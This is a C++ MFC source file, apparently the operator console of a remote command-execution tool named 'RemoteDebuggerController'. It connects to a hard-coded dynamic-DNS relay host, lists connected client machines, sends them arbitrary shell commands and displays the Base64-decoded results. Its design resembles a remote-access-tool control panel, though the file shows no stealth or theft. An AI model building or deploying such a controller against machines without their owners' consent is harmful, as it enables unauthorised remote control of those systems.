
// RemoteDebuggerControllerDlg.cpp : 实现文件
//

#include "stdafx.h"
#include "RemoteDebuggerController.h"
#include "RemoteDebuggerControllerDlg.h"

#include "..\公共\ProtocolHandler.h"
#include "..\iocp\IOCPExport.h"
#pragma comment(lib,"IOCP.lib")

#include "..\公共\Base64.h"

#if defined(DEBUG) || defined(_DEBUG)
#define REMOTE_SERVER_IP "localhost"
#else
#define REMOTE_SERVER_IP "gz8912.jios.org"
#endif


#ifdef _DEBUG
#define new DEBUG_NEW
#endif



// CRemoteDebuggerControllerDlg 对话框




CRemoteDebuggerControllerDlg::CRemoteDebuggerControllerDlg(CWnd* pParent /*=NULL*/)
	: CDialog(CRemoteDebuggerControllerDlg::IDD, pParent)
	, m_strCmdLine(_T(""))
{
	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);
	m_hCurClient = NULL;
	m_hClient = NULL;
}

void CRemoteDebuggerControllerDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	DDX_Text(pDX, IDC_EDIT1, m_strCmdLine);
	DDX_Control(pDX, IDC_EDIT2, m_wndMsgShow);
	DDX_Control(pDX, IDC_LIST1, m_wndOnLineClient);
	DDX_Control(pDX, IDC_EDIT3, m_wndCurClient);
}

BEGIN_MESSAGE_MAP(CRemoteDebuggerControllerDlg, CDialog)
	ON_WM_PAINT()
	ON_WM_QUERYDRAGICON()
	//}}AFX_MSG_MAP
	ON_BN_CLICKED(IDOK, &CRemoteDebuggerControllerDlg::OnBnClickedOk)
	ON_MESSAGE(WM_USER+2222,OnHandleRecvMsg)
	ON_WM_TIMER()
	ON_LBN_SELCHANGE(IDC_LIST1, &CRemoteDebuggerControllerDlg::OnLbnSelchangeList1)
	ON_BN_CLICKED(IDC_BUTTON1, &CRemoteDebuggerControllerDlg::OnBnClickedButton1)
END_MESSAGE_MAP()


//  DWORD WINAPI RecvDataThread( PVOID pParam )
//  {
//  	CRemoteDebuggerControllerDlg *pThis = (CRemoteDebuggerControllerDlg *)pParam;
//  	char chRecvBuffer[4096];
//  	while (TRUE)
//  	{
//  		int nRecvRes = pThis->m_tcpSock.RecvData(chRecvBuffer,4094);
//  		if (nRecvRes <= 0)
//  		{
//  			break;
//  		}
//  		chRecvBuffer[nRecvRes] = 0;
//  		chRecvBuffer[nRecvRes+1] = 0;
//  		
//   		CString strMsgOut;
//   		strMsgOut = (WCHAR *)chRecvBuffer;
//   
//   		int nLen = strMsgOut.GetLength();
//   		WCHAR *pszMsgBuf = new WCHAR[nLen+1];
//   		wcscpy_s(pszMsgBuf,nLen+1,strMsgOut.GetBuffer());
//   
//   		pThis->PostMessage(WM_USER+2222,(WPARAM)pszMsgBuf,0);
//  
//  	}
//  
//  
//  	return 0;
//  }

LRESULT CRemoteDebuggerControllerDlg::OnHandleRecvMsg(WPARAM wParam,LPARAM lParam)
{
	LPCSTR pszMsgText = (LPCSTR)wParam;

	CProtocolHandler ptlHandler;
	ptlHandler.ParseProtocolString(pszMsgText,strlen(pszMsgText));

	CStringA strCmd;
	strCmd = ptlHandler.GetParamValueString("cmd","");

	if (strCmd == "getonlineclient")
	{
		while( m_wndOnLineClient.GetCount() > 0 )
		{
			m_wndOnLineClient.DeleteString(0);
		}
		int nCount = ptlHandler.GetParamValueInt( "clientcount",0 );
		for ( int i = 0;i<nCount;i++)
		{
			CStringA strTempKeyName;
			strTempKeyName.Format("client%d",i);
			HANDLE hHandle = (HANDLE)ptlHandler.GetParamValueInt(strTempKeyName,0);

			CString strListItem;
			strListItem.Format(L"%d",hHandle);
			m_wndOnLineClient.AddString( strListItem );

			int a=0;
		}
	}

	if ( strCmd == "runcmd" )
	{
		CStringA strCmdResult;
		strCmdResult = ptlHandler.GetParamValueString("result","");
		
// #ifdef DEBUG
// 		OutputDebugStringA("控制端\r\n");
// 		OutputDebugStringA(strCmdResult);
// 		OutputDebugStringA("\r\n");
// #endif

		strCmdResult = EasyBase64Decode(strCmdResult);

// #ifdef DEBUG
// 		OutputDebugStringA(strCmdResult);
// 		OutputDebugStringA("\r\n");
// #endif

		int nTextLen = m_wndMsgShow.GetWindowTextLengthW();
		m_wndMsgShow.SetSel(nTextLen,nTextLen);
		m_wndMsgShow.ReplaceSel(CString(strCmdResult));
	}

	return 0;
}

CRemoteDebuggerControllerDlg *pThis = NULL;
VOID WINAPI DataRecvCallback( HANDLE hClient, BYTE *pDataBuffer,DWORD dwDatalen )
{
	CStringA strMsgOut;
	strMsgOut.Append((char *)pDataBuffer,dwDatalen);

	int nLen = strMsgOut.GetLength();
	char *pszMsgBuf = new char[nLen+1];
	strcpy_s(pszMsgBuf,nLen+1,strMsgOut.GetBuffer());

	pThis->PostMessage(WM_USER+2222,(WPARAM)pszMsgBuf,0);
}
VOID WINAPI ConnectClosed( HANDLE hClient )
{
	int a=0;
}

BOOL CRemoteDebuggerControllerDlg::OnInitDialog()
{
	CDialog::OnInitDialog();

	// 设置此对话框的图标。当应用程序主窗口不是对话框时，框架将自动
	//  执行此操作
	SetIcon(m_hIcon, TRUE);			// 设置大图标
	SetIcon(m_hIcon, FALSE);		// 设置小图标

	m_wndMsgShow.SetLimitText(0);
#ifdef DEBUG
	Sleep(500);
#endif
	
	pThis = this;
	m_hClient = CreateClient(DataRecvCallback,ConnectClosed);
	BOOL bConRes = ClientConnect(m_hClient,REMOTE_SERVER_IP,8890);
	if (bConRes)
	{
		StartRecvData(m_hClient);
	}

	RefushOnClient();

	SetTimer(1111,10000,NULL);
	

	return TRUE;  // 除非将焦点设置到控件，否则返回 TRUE
}

// 如果向对话框添加最小化按钮，则需要下面的代码
//  来绘制该图标。对于使用文档/视图模型的 MFC 应用程序，
//  这将由框架自动完成。

void CRemoteDebuggerControllerDlg::OnPaint()
{
	if (IsIconic())
	{
		CPaintDC dc(this); // 用于绘制的设备上下文

		SendMessage(WM_ICONERASEBKGND, reinterpret_cast<WPARAM>(dc.GetSafeHdc()), 0);

		// 使图标在工作区矩形中居中
		int cxIcon = GetSystemMetrics(SM_CXICON);
		int cyIcon = GetSystemMetrics(SM_CYICON);
		CRect rect;
		GetClientRect(&rect);
		int x = (rect.Width() - cxIcon + 1) / 2;
		int y = (rect.Height() - cyIcon + 1) / 2;

		// 绘制图标
		dc.DrawIcon(x, y, m_hIcon);
	}
	else
	{
		CDialog::OnPaint();
	}
}



HCURSOR CRemoteDebuggerControllerDlg::OnQueryDragIcon()
{
	return static_cast<HCURSOR>(m_hIcon);
}


void CRemoteDebuggerControllerDlg::OnBnClickedOk()
{
	UpdateData();
	
	if (m_hCurClient)
	{
		CStringA strTargetHandle;
		strTargetHandle.Format("%d",m_hCurClient);

		if (strTargetHandle.GetLength() > 0 )
		{
			CProtocolHandler ptlHandler;
			ptlHandler.SetParamValueString("cmd","runcmd");
			ptlHandler.SetParamValueString("data",CStringA(m_strCmdLine));
			ptlHandler.SetParamValueString("target",strTargetHandle);

			CStringA strSendData;
			strSendData = ptlHandler.BuildData();
			ClientSendData(m_hClient,(BYTE *)strSendData.GetBuffer(),strSendData.GetLength());

			int a=0;
		}

	}
}

void CRemoteDebuggerControllerDlg::OnTimer(UINT_PTR nIDEvent)
{
	if ( nIDEvent == 1111 )
	{
		RefushOnClient();
	}

	CDialog::OnTimer(nIDEvent);
}

VOID CRemoteDebuggerControllerDlg::RefushOnClient(void)
{
	CProtocolHandler ptlHandler;
	ptlHandler.SetParamValueString("cmd","getonlineclient");

	CStringA strSendData;
	strSendData = ptlHandler.BuildData();

	ClientSendData(m_hClient,(BYTE *)strSendData.GetBuffer(),strSendData.GetLength());

	return VOID();
}

void CRemoteDebuggerControllerDlg::OnLbnSelchangeList1()
{
	int nSelIndex = m_wndOnLineClient.GetCurSel();
	if (nSelIndex >= 0)
	{
		CString strTargetHandle;
		m_wndOnLineClient.GetText(nSelIndex,strTargetHandle);

		m_hCurClient = (HANDLE)_ttoi(strTargetHandle);

		m_wndCurClient.SetWindowText(strTargetHandle);
	}
}

void CRemoteDebuggerControllerDlg::OnBnClickedButton1()
{
	m_wndMsgShow.SetWindowText(L"");
}
